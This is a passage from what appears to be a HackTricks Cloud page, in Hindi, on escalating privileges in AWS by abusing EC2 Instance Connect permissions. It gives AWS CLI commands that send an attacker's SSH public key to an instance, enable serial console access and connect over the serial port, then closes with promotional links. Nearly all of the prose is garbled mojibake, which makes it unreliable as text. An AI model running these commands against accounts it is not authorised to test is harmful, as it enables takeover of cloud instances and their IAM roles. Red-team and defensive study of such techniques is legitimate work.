рд╣реИ)ред

### `ec2-instance-connect:SendSSHPublicKey`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ **`ec2-instance-connect:SendSSHPublicKey`** рд╣реИ, рд╡рд╣ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП ssh рдХреБрдВрдЬреА рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ (рдпрджрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ ssh рдкрд╣реБрдБрдЪ рд╣реИ) рдпрд╛ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** EC2 IAM рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ **рдПрдХ рд╕реАрд░рд┐рдпрд▓ рдХрдиреЗрдХреНрд╢рди рдореЗрдВ ssh рдХреБрдВрдЬреА рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рд╕реАрд░рд┐рдпрд▓ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`ec2:EnableSerialConsoleAccess` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**ред

рд╕реАрд░рд┐рдпрд▓ рдкреЛрд░реНрдЯ рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рдХреЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рднреА рдЬрд╛рдирдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**ред

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

рдпрд╣ рддрд░реАрдХрд╛ privesc рдХреЗ рд▓рд┐рдП рдЙрддрдирд╛ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** (рдЕрддреНрдпрдзрд┐рдХ рдЕрд╕рдВрднрд╛рд╡реНрдп) рд╕реАрдзреЗ EC2 IAM рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП privesc рдЬреЛ рдЪрд▓ рд░рд╣реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рд╕реЗ рдЬреБрдбрд╝реА рд╣реБрдИ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
